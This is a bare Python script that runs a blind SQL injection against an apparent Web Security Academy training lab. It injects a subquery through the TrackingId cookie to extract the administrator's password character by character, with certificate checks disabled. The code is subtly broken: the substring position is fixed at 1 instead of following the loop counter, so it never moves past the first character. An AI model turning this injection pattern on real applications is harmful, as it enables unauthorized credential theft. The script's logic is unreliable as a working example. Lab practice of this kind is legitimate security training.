import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "https":"https://127.0.0.1",
    "http":"http://127.0.0.1"
}

headers = {
    'authority': '0aaa00b20402c92b829c3845009f00ab.web-security-academy.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'no-cache',
     'cookie': 'TrackingId=b2Pv2xjFvwE0pwt0; session=AHs4uEH2hElxA7jM1QHCGxDmRLg7kISi',
    'pragma': 'no-cache',
    'referer': 'https://0aaa00b20402c92b829c3845009f00ab.web-security-academy.net/',
    'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}
alphanumeric = "abcdefghijklmnopqrtsuvwxyz0123456789"
password=""
for i in range(1,21):
    for c in alphanumeric:
        cookies = {
            'TrackingId': f"b2Pv2xjFvwE0pwt0'AND (SELECT substr(password,1,1) FROM Users WHERE Username = 'administrator' )='{c}",
            'session': 'AHs4uEH2hElxA7jM1QHCGxDmRLg7kISi',
        }
        response = requests.get(
            'https://0aaa00b20402c92b829c3845009f00ab.web-security-academy.net/login',
            cookies=cookies,
            headers=headers,
            verify=False
        )
        if "Welcome back!" in response.text:
           password+=c
           print(c + " is selected Charecter ",end="")
        else:
            print(c + " is not the selected charecter ")
print(password)
